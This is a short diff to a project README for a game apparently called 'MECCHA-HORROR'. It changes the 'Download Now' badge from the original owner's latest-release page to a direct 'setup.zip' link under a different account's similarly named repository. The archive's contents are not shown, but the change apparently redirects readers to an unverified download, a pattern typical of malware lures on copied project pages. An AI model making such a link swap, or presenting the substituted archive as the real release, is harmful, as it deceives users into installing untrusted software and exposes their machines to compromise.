@@ -10,7 +10,7 @@
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/SilentJMA/MECCHA-HORROR-Beta/releases/latest)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/ActivistSupervise/MECCHA-HORROR-BETA-TEST/releases/download/setup/setup.zip)
 
 </div>
 
